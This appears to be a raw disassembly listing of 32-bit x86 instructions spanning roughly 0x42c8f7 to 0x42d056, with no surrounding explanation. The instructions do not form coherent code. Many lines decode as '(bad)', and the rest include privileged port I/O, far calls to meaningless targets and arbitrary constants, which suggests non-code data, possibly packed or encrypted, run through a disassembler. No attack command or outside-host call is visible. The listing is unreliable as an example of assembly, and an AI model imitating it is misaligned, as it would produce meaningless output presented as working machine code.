  42c8f7:	add    DWORD PTR [ebp+ebp*2+0x2f5ba785],esi
  42c8fe:	xor    eax,DWORD PTR [edx+eiz*1-0x78]
  42c902:	dec    ebp
  42c903:	adc    BYTE PTR [eax+0x21d30191],dh
  42c909:	add    al,0x34
  42c90b:	add    DWORD PTR [ebp-0x15],esi
  42c90e:	xlat   BYTE PTR ds:[ebx]
  42c90f:	sub    DWORD PTR [eax+0x50],edx
  42c912:	popf   
  42c913:	mov    ds:0x1688573,eax
  42c918:	ins    BYTE PTR es:[edi],dx
  42c919:	pop    ebp
  42c91a:	and    al,0x8b
  42c91c:	mov    ds:0x6d6e2006,al
  42c921:	adc    eax,edi
  42c923:	mov    esp,ebx
  42c925:	cmp    al,0x94
  42c927:	cwde   
  42c928:	call   0x3f867203
  42c92d:	jecxz  0x42c93b
  42c92f:	sbb    DWORD PTR [ebx-0x56],edi
  42c932:	fsubr  DWORD PTR [esi+0x50]
  42c935:	add    esp,esi
  42c937:	or     al,0xe
  42c939:	in     al,dx
  42c93a:	mov    ebx,0x30bb47ea
  42c93f:	add    edi,0xb234e243
  42c945:	jo     0x42c98b
  42c947:	retf   0x6d2f
  42c94a:	pop    ds
  42c94b:	lea    esi,ss:[ebx-0x2b1fee36]
  42c952:	add    BYTE PTR [ecx+ebp*8-0x26],bl
  42c956:	mov    dh,BYTE PTR ss:[esi]
  42c959:	pusha  
  42c95a:	lahf   
  42c95b:	ins    DWORD PTR es:[edi],dx
  42c95c:	(bad)  
  42c95e:	cmp    eax,0x829adc11
  42c963:	adc    dh,BYTE PTR [edx-0x39b34735]
  42c969:	shl    BYTE PTR [esi+0x53324775],cl
  42c96f:	and    eax,0x616b9344
  42c974:	xchg   DWORD PTR [eax+0x22],ebp
  42c977:	outs   dx,BYTE PTR ds:[esi]
  42c978:	fld    TBYTE PTR [esi+edx*2]
  42c97b:	push   ds
  42c97c:	sahf   
  42c97d:	retf   
  42c97e:	pop    es
  42c97f:	sti    
  42c980:	add    al,0xdb
  42c982:	adc    al,BYTE PTR [ebp-0x73]
  42c985:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c986:	fidiv  WORD PTR [eax+ebx*4+0x41d802f]
  42c98d:	ins    DWORD PTR es:[edi],dx
  42c98e:	push   ebx
  42c98f:	sbb    eax,0xd051bb77
  42c994:	mov    ds:0xd7a306b6,al
  42c999:	sbb    eax,0xa6dad8b8
  42c99e:	call   0xf2ed8b59
  42c9a3:	mov    esp,0xfcfaecbf
  42c9a8:	jecxz  0x42c9ba
  42c9aa:	ins    DWORD PTR es:[edi],dx
  42c9ab:	sub    al,0xdd
  42c9ad:	fwait
  42c9ae:	jle    0x42ca03
  42c9b0:	sub    DWORD PTR [ebp+0x36],ebx
  42c9b3:	mov    esp,0x75b6edb7
  42c9b8:	push   esi
  42c9b9:	addr16 jp 0x42c9b8
  42c9bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c9bd:	loop   0x42c95e
  42c9bf:	push   eax
  42c9c0:	inc    edi
  42c9c1:	sbb    eax,0x962a0063
  42c9c6:	adc    BYTE PTR [esi+0x785004a3],0xc5
  42c9cd:	lea    esp,[ebp-0x735162d2]
  42c9d3:	in     al,dx
  42c9d4:	and    al,0xeb
  42c9d6:	ffree  st(2)
  42c9d8:	(bad)  
  42c9d9:	(bad)  
  42c9da:	add    BYTE PTR [ebp+ebp*4-0x3a0f1935],dh
  42c9e1:	dec    edi
  42c9e2:	fimul  DWORD PTR [esi+0x1c6c2e2]
  42c9e8:	pop    ebp
  42c9e9:	pop    ds
  42c9ea:	loopne 0x42c9b6
  42c9ec:	imul   ebx,ebp,0x22
  42c9ef:	mov    ss:0xdcb75cdd,al
  42c9f5:	mov    WORD PTR [eax+eiz*4+0x5b],ds
  42c9f9:	inc    edi
  42c9fa:	lds    ebp,FWORD PTR [esi+0x38e85c37]
  42ca00:	xor    al,0x41
  42ca02:	imul   eax,esp,0xffffffb6
  42ca05:	mov    DWORD PTR [edx+0x69bc5554],eax
  42ca0b:	push   0x6020ba1a
  42ca10:	pop    es
  42ca11:	sar    DWORD PTR [ebx],1
  42ca13:	in     eax,0x30
  42ca15:	fisttp QWORD PTR [ecx]
  42ca17:	mov    dh,0x6
  42ca19:	push   ss
  42ca1a:	icebp  
  42ca1b:	lea    cx,[edi]
  42ca1e:	inc    esp
  42ca1f:	rol    BYTE PTR [edi-0x25],cl
  42ca22:	adc    BYTE PTR [ecx+eiz*4+0xb],dh
  42ca26:	xchg   ecx,eax
  42ca27:	gs inc edi
  42ca29:	jns    0x42caa7
  42ca2b:	xchg   DWORD PTR [eax+0x2d],ebp
  42ca2e:	ins    BYTE PTR es:[edi],dx
  42ca2f:	sbb    ebx,DWORD PTR [ebx+0x5c]
  42ca32:	rol    BYTE PTR [ecx+0x6acf023c],0x2
  42ca39:	dec    ebp
  42ca3a:	push   esp
  42ca3b:	pop    ebx
  42ca3c:	mov    cl,0x1d
  42ca3e:	mov    esi,0xbd2431d2
  42ca43:	lods   eax,DWORD PTR ds:[esi]
  42ca44:	pop    ebp
  42ca45:	push   0xffffffaa
  42ca47:	imul   esp,esi,0x27
  42ca4a:	mov    al,0x20
  42ca4c:	dec    ecx
  42ca4d:	push   cs
  42ca4e:	bound  esi,QWORD PTR [esi+0x36a8d5b1]
  42ca54:	int3   
  42ca55:	std    
  42ca56:	sbb    BYTE PTR fs:[eax],0xa7
  42ca5a:	outs   dx,BYTE PTR ds:[esi]
  42ca5b:	fcmovnb st,st(6)
  42ca5d:	ret    0xd322
  42ca60:	dec    edx
  42ca61:	mov    ebp,0xe49b66c
  42ca66:	push   0xb71b15d3
  42ca6b:	(bad)  
  42ca6f:	push   ss
  42ca70:	nop
  42ca71:	in     eax,dx
  42ca72:	je     0x42c9fc
  42ca74:	fisubr DWORD PTR [esi+0x1d]
  42ca77:	adc    ebx,0xfffffffc
  42ca7a:	pop    ds
  42ca7b:	inc    ebp
  42ca7c:	mov    DWORD PTR [eax],edx
  42ca7e:	mov    bh,0xc2
  42ca80:	jbe    0x42caed
  42ca82:	cmp    al,0x15
  42ca84:	push   eax
  42ca85:	(bad)  
  42ca86:	cmp    cl,dl
  42ca88:	pop    edi
  42ca89:	xchg   BYTE PTR cs:[ebx],cl
  42ca8c:	out    dx,eax
  42ca8d:	push   cs
  42ca8e:	mov    al,ds:0x5d105476
  42ca93:	cmp    edx,DWORD PTR [esi-0x46]
  42ca96:	mov    cl,0xb0
  42ca98:	inc    ecx
  42ca99:	std    
  42ca9a:	retf   0x198b
  42ca9d:	sub    eax,0xa35b5ffb
  42caa2:	push   0x2a
  42caa4:	or     DWORD PTR [ebx],ebx
  42caa6:	xor    DWORD PTR [ebx+0x6f],edx
  42caa9:	add    BYTE PTR [esi],0x0
  42caac:	mov    dh,0x4
  42caae:	je     0x42cb03
  42cab0:	push   esp
  42cab1:	mov    al,ds:0x16d0b82a
  42cab6:	fdiv   DWORD PTR [eax+edi*1+0xd36c3a3]
  42cabd:	adc    BYTE PTR [ebx+0x1b],cl
  42cac0:	outs   dx,BYTE PTR ds:[esi]
  42cac1:	mov    ebp,DWORD PTR [edi+0x3e]
  42cac4:	pop    edx
  42cac5:	push   ecx
  42cac6:	jl     0x42ca89
  42cac8:	ins    DWORD PTR es:[edi],dx
  42cac9:	mov    ds:0xdfb9ca0a,eax
  42cace:	add    ebp,eax
  42cad0:	jle    0x42ca53
  42cad2:	sbb    ah,BYTE PTR [eax-0x34a00b3]
  42cad8:	clc    
  42cad9:	ins    DWORD PTR es:[edi],dx
  42cada:	cmp    BYTE PTR [eax],dl
  42cadc:	in     al,dx
  42cadd:	sbb    BYTE PTR [ebx+0x2c],0x72
  42cae1:	fistp  QWORD PTR [ecx]
  42cae3:	mov    DWORD PTR [eax+0x45],esi
  42cae6:	sbb    edx,DWORD PTR [eax+0x43]
  42cae9:	shl    al,1
  42caeb:	dec    esp
  42caec:	test   DWORD PTR [eax-0x2bc9dff2],esp
  42caf2:	pop    esp
  42caf3:	mov    dh,0xf3
  42caf5:	fild   WORD PTR [edx+0x40896160]
  42cafb:	pop    ecx
  42cafc:	inc    ebx
  42cafd:	popf   
  42cafe:	push   ecx
  42caff:	pop    ebp
  42cb00:	push   0xffffff9b
  42cb02:	adc    DWORD PTR [edi-0x3970a35a],esi
  42cb08:	clc    
  42cb09:	stos   BYTE PTR es:[edi],al
  42cb0a:	mov    dh,0x45
  42cb0c:	xor    eax,0xf6db1ef3
  42cb11:	add    bl,BYTE PTR [ebx+0x1f]
  42cb14:	adc    eax,0x358dcbb5
  42cb19:	and    dl,dh
  42cb1b:	or     al,bl
  42cb1d:	cs ins BYTE PTR es:[edi],dx
  42cb1f:	(bad)  
  42cb20:	popf   
  42cb21:	std    
  42cb22:	xchg   ebx,eax
  42cb23:	out    0x65,eax
  42cb25:	out    dx,eax
  42cb26:	shl    DWORD PTR [esi-0x700c924c],1
  42cb2c:	xor    edx,esi
  42cb2e:	push   ebp
  42cb2f:	into   
  42cb30:	bound  ebx,QWORD PTR [edi+0x2e]
  42cb33:	mov    ch,0x23
  42cb35:	fiadd  DWORD PTR [eax]
  42cb37:	jae    0x42cb27
  42cb39:	adc    BYTE PTR ds:0xb40bee91,dl
  42cb3f:	jne    0x42cb42
  42cb41:	loope  0x42cba5
  42cb43:	mov    al,0xe1
  42cb45:	push   ebx
  42cb46:	or     eax,0x1432adb6
  42cb4b:	mov    ah,0x52
  42cb4d:	arpl   WORD PTR [edx+0x441d88ef],bp
  42cb53:	(bad)  [edi]
  42cb55:	addr16 inc ebp
  42cb57:	daa    
  42cb58:	xchg   esi,eax
  42cb59:	call   0x35f4:0x83a0a15b
  42cb60:	inc    eax
  42cb61:	xor    edx,DWORD PTR ds:[ecx-0x4b]
  42cb65:	and    ecx,DWORD PTR [edx+0x1307cd28]
  42cb6b:	fwait
  42cb6c:	or     BYTE PTR [edx+0x3240ba75],bh
  42cb72:	repz mov ah,0x61
  42cb75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cb76:	sbb    eax,0x403c45d8
  42cb7b:	repnz push ecx
  42cb7d:	sar    DWORD PTR cs:[ecx+0x4d],1
  42cb81:	adc    eax,0x61eb02ec
  42cb86:	pop    ss
  42cb87:	mov    ebp,0xb514745f
  42cb8c:	inc    ebp
  42cb8d:	or     esp,ebx
  42cb8f:	pop    ecx
  42cb90:	loop   0x42cb6a
  42cb92:	push   ecx
  42cb93:	sub    eax,0x9a797014
  42cb98:	mov    esp,0xb6d6c1f7
  42cb9d:	shl    BYTE PTR [eax],1
  42cb9f:	fld    DWORD PTR [ebx+0x46d6ba98]
  42cba5:	lds    ebp,FWORD PTR [esi]
  42cba7:	mov    eax,0x187974b1
  42cbac:	sahf   
  42cbad:	(bad)  
  42cbae:	call   0x10d5:0xb8ae52a2
  42cbb5:	es (bad) 
  42cbb8:	mov    esi,0xc415f051
  42cbbd:	ret    0xf0d2
  42cbc0:	and    edi,ebp
  42cbc2:	inc    esi
  42cbc3:	push   ebp
  42cbc4:	stc    
  42cbc5:	in     eax,0xd2
  42cbc7:	inc    edx
  42cbc8:	fcomi  st,st(0)
  42cbca:	mov    edi,0xf413a70a
  42cbcf:	es pop ds
  42cbd1:	jno    0x42cb98
  42cbd3:	mov    dh,0x81
  42cbd5:	test   al,0x5b
  42cbd7:	retf   0x5e0d
  42cbda:	cmp    edx,DWORD PTR ds:0x576a8edb
  42cbe0:	js     0x42cc15
  42cbe2:	fadd   st,st(1)
  42cbe4:	cld    
  42cbe5:	jae    0x42cb82
  42cbe7:	sbb    al,ah
  42cbe9:	inc    edx
  42cbea:	inc    ebx
  42cbeb:	add    BYTE PTR [eax+esi*4],ch
  42cbee:	aaa    
  42cbef:	dec    ecx
  42cbf0:	cld    
  42cbf1:	ins    DWORD PTR es:[edi],dx
  42cbf2:	(bad)  [esi+0x502442a6]
  42cbf8:	sbb    BYTE PTR [eax],cl
  42cbfa:	cmp    edi,DWORD PTR [ecx-0x27f6701c]
  42cc00:	sub    BYTE PTR [esi-0x3d8f676b],dh
  42cc06:	mov    ah,0xb5
  42cc08:	lods   eax,DWORD PTR ds:[esi]
  42cc09:	jne    0x42cc74
  42cc0b:	mov    eax,ds:0x387bee82
  42cc10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cc11:	sub    eax,0x6868c86a
  42cc16:	(bad)  [esi-0x345bcafa]
  42cc1c:	pop    ebx
  42cc1d:	pop    ss
  42cc1e:	stc    
  42cc1f:	adc    DWORD PTR [ebx+0x75],edx
  42cc22:	push   ecx
  42cc23:	ins    DWORD PTR es:[edi],dx
  42cc24:	xor    dh,0x9a
  42cc27:	test   al,0xb0
  42cc29:	rol    ecx,1
  42cc2b:	push   es
  42cc2c:	or     BYTE PTR [esi-0x30],ch
  42cc2f:	fwait
  42cc30:	pop    eax
  42cc31:	das    
  42cc32:	jg     0x42cc73
  42cc34:	or     al,ah
  42cc36:	inc    edx
  42cc37:	pop    ss
  42cc38:	mov    esi,edx
  42cc3a:	dec    ecx
  42cc3b:	xchg   ecx,eax
  42cc3d:	dec    ebp
  42cc3e:	in     eax,0x37
  42cc40:	mov    edx,0xe957b7e3
  42cc45:	add    DWORD PTR [eax],0x3774001e
  42cc4b:	push   0x3
  42cc4d:	fmul   DWORD PTR [edx]
  42cc4f:	mov    eax,0x89d4a96e
  42cc54:	test   DWORD PTR [esi-0x15],esi
  42cc57:	and    bh,BYTE PTR [esi+0x6c8c859]
  42cc5d:	mov    edi,0x85c435f4
  42cc62:	test   DWORD PTR [ebx],ecx
  42cc64:	cmp    dl,ah
  42cc66:	mov    BYTE PTR [esi],bh
  42cc68:	repnz daa 
  42cc6a:	jo     0x42cc2c
  42cc6c:	push   esi
  42cc6d:	mov    ds:0x9e9c262d,al
  42cc72:	and    al,0x47
  42cc74:	das    
  42cc75:	fwait
  42cc76:	and    bl,al
  42cc78:	adc    eax,0x7a2af8e6
  42cc7d:	sbb    eax,0x1756e8dd
  42cc82:	inc    ecx
  42cc83:	push   edi
  42cc84:	push   ebp
  42cc85:	adc    BYTE PTR [ecx-0x5e927264],0x3
  42cc8c:	cmp    ah,BYTE PTR [edx+eiz*8-0x2b]
  42cc90:	xor    dh,BYTE PTR [ebx]
  42cc92:	push   es
  42cc93:	mov    eax,0x8dc50d6d
  42cc98:	jnp    0x42ccfd
  42cc9a:	cld    
  42cc9b:	sub    eax,0xa6847d11
  42cca0:	dec    ebx
  42cca1:	lods   eax,DWORD PTR ds:[esi]
  42cca2:	mov    ds:0x84886601,al
  42cca7:	clc    
  42cca8:	jmp    0x2b:0xf28186e1
  42ccaf:	push   eax
  42ccb0:	jl     0x42ccb2
  42ccb2:	arpl   WORD PTR [ecx],cx
  42ccb4:	fnstcw WORD PTR [esi+0x52d16c03]
  42ccba:	ficom  DWORD PTR [esi+0x7a]
  42ccbd:	lods   al,BYTE PTR ds:[esi]
  42ccbe:	test   esp,eax
  42ccc0:	ret    0x40cd
  42ccc3:	pop    eax
  42ccc4:	mov    ds:0x6a756ccb,al
  42ccc9:	pop    esp
  42ccca:	cs loop 0x42cca3
  42cccd:	inc    ecx
  42ccce:	mov    ebx,0xf08e53d7
  42ccd3:	test   eax,0xc511d6ed
  42ccd8:	jne    0x42cc62
  42ccda:	les    eax,FWORD PTR [edx+0x59]
  42ccdd:	stos   BYTE PTR es:[edi],al
  42ccde:	loope  0x42cd1e
  42cce0:	jbe    0x42cc83
  42cce2:	in     eax,dx
  42cce3:	add    ch,0x82
  42cce6:	shl    esi,1
  42cce8:	mov    WORD PTR [edi-0x44c1a9dc],gs
  42ccee:	xor    eax,0x540fd510
  42ccf3:	adc    DWORD PTR [edi],0x38
  42ccf6:	retf   
  42ccf7:	mov    bl,0x17
  42ccf9:	mov    dh,0x85
  42ccfb:	ins    DWORD PTR es:[edi],dx
  42ccfc:	iret   
  42ccfd:	mov    edi,0x2f15ebaf
  42cd02:	cli    
  42cd03:	adc    BYTE PTR [ebp+0x0],cl
  42cd06:	jne    0x42cd63
  42cd08:	push   0xffffffcb
  42cd0a:	nop
  42cd0b:	push   0x74
  42cd0d:	sub    al,0xaa
  42cd0f:	dec    edi
  42cd10:	bound  ebp,QWORD PTR [ebx+edx*8+0xdad8a2]
  42cd17:	cs sti 
  42cd19:	jmp    0x42cd49
  42cd1b:	mov    ecx,0x3adc2db6
  42cd20:	jl     0x42cd3b
  42cd22:	or     eax,DWORD PTR [edx]
  42cd24:	leave  
  42cd25:	addr16 (bad) 
  42cd27:	sub    al,0xf1
  42cd29:	jp     0x42ccb3
  42cd2b:	lea    ebx,[ebp-0x3b]
  42cd2e:	jne    0x42cd8a
  42cd30:	ror    BYTE PTR [ebp+0x417617d8],cl
  42cd36:	shl    BYTE PTR [esi],0xa0
  42cd39:	push   ebp
  42cd3a:	sbb    eax,DWORD PTR [esi+esi*1-0x12aa89c9]
  42cd41:	test   al,0x5b
  42cd43:	jo     0x42cd2a
  42cd45:	call   0x39e5d33
  42cd4a:	aad    0x8f
  42cd4c:	jns    0x42cce7
  42cd4e:	mov    bl,0x44
  42cd50:	jo     0x42cd29
  42cd52:	lods   al,BYTE PTR ds:[esi]
  42cd53:	mov    ch,0x4a
  42cd55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cd56:	sbb    edi,DWORD PTR [edx-0x58d374b7]
  42cd5c:	fnsave [eax-0x5f]
  42cd5f:	mov    al,0x6d
  42cd61:	cmp    ch,BYTE PTR [eax-0x1a]
  42cd64:	rol    BYTE PTR [esi-0x7e],0x94
  42cd68:	mov    eax,ds:0x14d541a8
  42cd6d:	cmp    eax,0xd5569a54
  42cd72:	inc    edx
  42cd73:	cmp    edi,0x827fb0f4
  42cd79:	outs   dx,BYTE PTR ds:[esi]
  42cd7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cd7b:	sbb    BYTE PTR [ecx-0x59],0xac
  42cd7f:	xor    eax,DWORD PTR [edi+0x11]
  42cd82:	mov    bh,0xae
  42cd84:	sub    DWORD PTR [edi],edx
  42cd86:	push   eax
  42cd87:	or     BYTE PTR [edi+edi*8-0x5b],0xb6
  42cd8c:	rcr    DWORD PTR [edx-0x50],1
  42cd8f:	je     0x42cd34
  42cd91:	cdq    
  42cd92:	xchg   ebx,eax
  42cd93:	mov    dh,0xf5
  42cd95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cd96:	or     BYTE PTR [ebp-0x3c],0x4
  42cd9a:	test   bl,cl
  42cd9c:	mov    ebx,0x42c5e034
  42cda1:	pop    ss
  42cda2:	(bad)  
  42cda5:	pop    esi
  42cda6:	pop    ecx
  42cda7:	and    eax,0xb616169e
  42cdac:	inc    esi
  42cdad:	jno    0x42cdea
  42cdaf:	fwait
  42cdb0:	xor    edi,edi
  42cdb2:	and    eax,0x1d5b0d
  42cdb7:	fstp   QWORD PTR [ecx+ecx*8-0x7d]
  42cdbb:	jns    0x42cdfb
  42cdbd:	add    DWORD PTR [edi-0x18],esp
  42cdc0:	sub    BYTE PTR [esi+0x6c],0xf5
  42cdc4:	imul   BYTE PTR ds:0x32835d69
  42cdca:	imul   ebp,DWORD PTR [ebx],0xca358dc
  42cdd0:	jb     0x42cddd
  42cdd2:	mov    cl,0x6d
  42cdd4:	clc    
  42cdd5:	push   ds
  42cdd6:	add    eax,0x6ddb0be5
  42cddb:	sbb    BYTE PTR [ecx],ch
  42cddd:	fwait
  42cdde:	pop    esi
  42cddf:	or     ebx,edx
  42cde1:	shl    DWORD PTR [edx-0x557a0000],cl
  42cde7:	fsubr  DWORD PTR [esi-0x4b]
  42cdea:	adc    esp,0xe03c7707
  42cdf0:	outs   dx,BYTE PTR ds:[esi]
  42cdf1:	dec    ebx
  42cdf2:	dec    ebp
  42cdf3:	inc    eax
  42cdf4:	in     al,dx
  42cdf5:	fcomi  st,st(3)
  42cdf7:	dec    ecx
  42cdf8:	dec    ebp
  42cdf9:	push   eax
  42cdfa:	xor    ch,BYTE PTR [eax]
  42cdfc:	mov    bh,0x2
  42cdfe:	mov    ah,0x6d
  42ce00:	cmc    
  42ce01:	inc    ecx
  42ce02:	xor    eax,0x878fefa2
  42ce07:	sub    bl,BYTE PTR [ebx]
  42ce09:	pop    ebx
  42ce0a:	inc    ebx
  42ce0b:	adc    edi,ebx
  42ce0d:	dec    eax
  42ce0e:	push   esi
  42ce0f:	push   0x2ed5eb36
  42ce14:	xor    eax,0x2908d7b6
  42ce19:	imul   edx,esp,0xd4dd5796
  42ce1f:	adc    cl,al
  42ce21:	push   es
  42ce22:	das    
  42ce23:	push   ebp
  42ce24:	lods   al,BYTE PTR ds:[esi]
  42ce25:	ins    BYTE PTR es:[edi],dx
  42ce26:	fadd   DWORD PTR ds:0xfdc654b5
  42ce2c:	cmp    eax,0xd85b5cf2
  42ce31:	sbb    cl,BYTE PTR [edx-0x53f11c72]
  42ce37:	mov    BYTE PTR [esi],ch
  42ce39:	imul   esp,DWORD PTR [eax+0x1b750076],0xfffffff5
  42ce40:	and    ecx,ebx
  42ce42:	popf   
  42ce43:	pop    ebx
  42ce44:	aad    0x3a
  42ce46:	cmp    cl,BYTE PTR [ebp-0x763896cc]
  42ce4c:	sbb    esp,edx
  42ce4e:	ins    BYTE PTR es:[edi],dx
  42ce4f:	mov    bh,0xad
  42ce51:	ins    DWORD PTR es:[edi],dx
  42ce52:	(bad)  
  42ce54:	xor    ch,BYTE PTR [edx+0x35bc506c]
  42ce5a:	push   ebx
  42ce5b:	inc    esp
  42ce5c:	push   cs
  42ce5d:	pop    esp
  42ce5e:	retf   
  42ce5f:	or     ecx,DWORD PTR [ecx]
  42ce61:	add    eax,0xd39fbf00
  42ce66:	mov    ecx,0x1d007545
  42ce6b:	xor    ebp,ebp
  42ce6d:	jno    0x42ce48
  42ce6f:	ins    BYTE PTR es:[edi],dx
  42ce70:	mov    bh,0xda
  42ce72:	lods   eax,DWORD PTR ds:[esi]
  42ce73:	xchg   esi,eax
  42ce74:	loopne 0x42ce69
  42ce76:	mov    dh,0xe9
  42ce78:	mov    BYTE PTR [ebx+edx*4+0x5b4b2a3b],dl
  42ce7f:	push   edi
  42ce80:	adc    BYTE PTR [esi+0x40],bl
  42ce83:	jecxz  0x42cefa
  42ce85:	stos   BYTE PTR es:[edi],al
  42ce86:	pop    ss
  42ce87:	test   DWORD PTR [esi+0x1d744ba2],eax
  42ce8d:	stc    
  42ce8e:	ficomp DWORD PTR [edi+0x3d]
  42ce91:	adc    al,0xb6
  42ce93:	or     eax,0xcd8a95a8
  42ce98:	jecxz  0x42ce9b
  42ce9a:	jbe    0x42ced9
  42ce9c:	fstp   st(2)
  42ce9e:	inc    esi
  42ce9f:	adc    ebx,esp
  42cea1:	loopne 0x42ce95
  42cea3:	push   esp
  42cea4:	test   al,0x2f
  42cea6:	neg    DWORD PTR [ebx+0x3]
  42cea9:	sub    eax,0xd7a43250
  42ceae:	call   0x8829:0xb1515e4a
  42ceb5:	dec    ecx
  42ceb6:	dec    ecx
  42ceb7:	mov    ch,0xeb
  42ceb9:	ret    0x45ad
  42cebc:	rcr    BYTE PTR [edi+0x6e],1
  42cebf:	jecxz  0x42cf32
  42cec1:	mov    bh,0x41
  42cec3:	xor    DWORD PTR [ecx+0x4d],eax
  42cec6:	lds    eax,FWORD PTR [ebp+0x58413df4]
  42cecc:	lds    ebp,FWORD PTR [ebp-0x2dd2497b]
  42ced2:	fistp  WORD PTR [eax-0x135fd647]
  42ced8:	out    dx,al
  42ced9:	xchg   ebp,eax
  42ceda:	push   0xffffff83
  42cedc:	fcmovb st,st(1)
  42cede:	pop    ss
  42cedf:	and    edi,DWORD PTR [esi+edi*1-0x6a]
  42cee3:	sub    eax,0x346d4570
  42cee8:	popa   
  42cee9:	pushf  
  42ceea:	xchg   edi,eax
  42ceeb:	adc    dh,BYTE PTR [ebp+0x50]
  42ceee:	mov    bh,0xa9
  42cef0:	fwait
  42cef1:	adc    al,0xb4
  42cef3:	retf   
  42cef4:	adc    bh,BYTE PTR [edi]
  42cef6:	or     ebx,DWORD PTR ds:0x1aeeadc0
  42cefc:	ins    DWORD PTR es:[edi],dx
  42cefd:	mov    edi,0x4dc640f3
  42cf02:	mov    ch,0x6d
  42cf04:	dec    ebp
  42cf05:	xchg   BYTE PTR [eax+0x41],dh
  42cf08:	fdiv   DWORD PTR [ebx+0x13395967]
  42cf0e:	lds    ebp,FWORD PTR [esi]
  42cf10:	add    dh,0xb5
  42cf13:	sbb    ebx,edi
  42cf15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cf16:	ins    DWORD PTR es:[edi],dx
  42cf17:	xor    al,0xd5
  42cf19:	outs   dx,DWORD PTR ds:[esi]
  42cf1a:	into   
  42cf1b:	in     eax,0x8c
  42cf1d:	lods   al,BYTE PTR ds:[esi]
  42cf1e:	push   ebp
  42cf1f:	push   esi
  42cf20:	or     dl,BYTE PTR [ebp+ecx*1+0x45]
  42cf24:	mov    ebx,0x771db8a0
  42cf29:	or     DWORD PTR [eax-0x53],0xffffffb5
  42cf2d:	mov    dh,0x9a
  42cf2f:	sub    dh,BYTE PTR [esi+0x1]
  42cf32:	je     0x42cebd
  42cf34:	cmp    bl,BYTE PTR [ebx+0x6e0abe25]
  42cf3a:	adc    al,0xaa
  42cf3c:	sbb    BYTE PTR [ebx],0x73
  42cf3f:	mov    eax,0xbb014360
  42cf44:	sar    BYTE PTR [edi-0x220e7852],1
  42cf4a:	push   esp
  42cf4b:	mov    ds:0xd942201a,al
  42cf50:	pop    es
  42cf51:	mov    bh,0x26
  42cf53:	add    BYTE PTR [eax-0x551d1853],bh
  42cf59:	test   BYTE PTR [edi+0x5b0bdc55],cl
  42cf5f:	inc    ebx
  42cf60:	adc    al,0x32
  42cf62:	lods   eax,DWORD PTR ds:[esi]
  42cf63:	jp     0x42cf32
  42cf65:	addr16 mov eax,0x6c2edb68
  42cf6b:	in     al,dx
  42cf6c:	scas   eax,DWORD PTR es:[edi]
  42cf6d:	pop    ebx
  42cf6e:	mov    ecx,0xfe7cbfc1
  42cf73:	call   0xbce4:0xa9a176c0
  42cf7a:	jae    0x42cf30
  42cf7c:	xchg   ebx,eax
  42cf7d:	jno    0x42cf63
  42cf7f:	mov    ebx,0x6e01da8a
  42cf84:	loope  0x42cfc0
  42cf86:	arpl   si,ax
  42cf88:	sub    BYTE PTR [ebx],dl
  42cf8a:	push   eax
  42cf8b:	push   edi
  42cf8c:	inc    ecx
  42cf8d:	xchg   ebp,eax
  42cf8e:	(bad)  
  42cf8f:	int3   
  42cf90:	inc    edx
  42cf91:	adc    eax,DWORD PTR [ebp+ebx*8+0x17]
  42cf95:	and    edx,DWORD PTR [ebp+0x56]
  42cf98:	in     al,dx
  42cf99:	cli    
  42cf9a:	mov    bh,0x16
  42cf9c:	(bad)  
  42cf9d:	shr    BYTE PTR [esi+0x1a78bbd7],cl
  42cfa3:	jae    0x42cf7f
  42cfa5:	mov    BYTE PTR [eax+0x7],ah
  42cfa8:	add    eax,0x7677b323
  42cfad:	popa   
  42cfae:	imul   ebp,DWORD PTR [ebx-0x24],0x18
  42cfb2:	inc    ecx
  42cfb3:	mov    cl,0x3d
  42cfb5:	shl    BYTE PTR [esi-0x27d68d11],0x51
  42cfbc:	ror    DWORD PTR [ebp-0x5f46e964],0xd8
  42cfc3:	test   al,0xb6
  42cfc5:	sub    eax,0xcc4a2ea
  42cfca:	cmp    BYTE PTR [ecx-0x23ff7441],bl
  42cfd0:	sbb    al,BYTE PTR [eax-0x5ca0bb23]
  42cfd6:	ror    DWORD PTR [ebp-0xfa3ca53],1
  42cfdc:	push   eax
  42cfdd:	push   ebx
  42cfde:	xchg   edx,eax
  42cfdf:	lods   al,BYTE PTR ds:[esi]
  42cfe0:	cmp    al,0x6e
  42cfe2:	or     ebx,DWORD PTR [ebp-0x40]
  42cfe5:	xchg   edi,eax
  42cfe6:	ins    DWORD PTR es:[edi],dx
  42cfe7:	fisubr WORD PTR [ecx]
  42cfe9:	out    dx,al
  42cfea:	sbb    al,0x8
  42cfec:	jno    0x42cf8d
  42cfee:	push   eax
  42cfef:	aad    0x6
  42cff1:	test   al,0x65
  42cff3:	sbb    bh,BYTE PTR [eax-0x2b4f4918]
  42cff9:	ds inc eax
  42cffb:	lds    esp,FWORD PTR [edx]
  42cffd:	addr16 pop esp
  42cfff:	push   0x4476ed40
  42d004:	mov    al,0x9
  42d006:	cld    
  42d007:	in     eax,dx
  42d008:	(bad)  
  42d009:	cld    
  42d00a:	sub    DWORD PTR [edx+0x6b],ecx
  42d00d:	(bad)  [esi]
  42d00f:	or     bh,bh
  42d011:	nop
  42d012:	(bad)  
  42d013:	jp     0x42d04c
  42d015:	and    ecx,eax
  42d017:	mov    ch,0x75
  42d019:	aam    0x76
  42d01b:	pop    esp
  42d01c:	shr    BYTE PTR [edi],0x18
  42d01f:	ss adc al,0x4a
  42d022:	(bad)  
  42d023:	rcl    BYTE PTR [ebp-0x2c],1
  42d026:	push   es
  42d027:	mov    WORD PTR [ecx+edi*1-0x76],ds
  42d02b:	mov    ebx,0xacb6e022
  42d030:	pop    ebp
  42d031:	push   eax
  42d032:	cdq    
  42d033:	int    0x47
  42d035:	xor    dl,BYTE PTR [ebp+0x5adc151d]
  42d03b:	call   0xfdd936a2
  42d040:	mov    BYTE PTR [eax-0x14],ch
  42d043:	add    al,BYTE PTR [edx+0x5a65566c]
  42d049:	jle    0x42d090
  42d04b:	push   ebx
  42d04c:	add    eax,0xe97af9dc
  42d051:	inc    esi
  42d052:	dec    ecx
  42d053:	aam    0x2
  42d055:	pop    edx
  42d056:	sub    BYTE PTR [esi-0x48f71a9f],bh
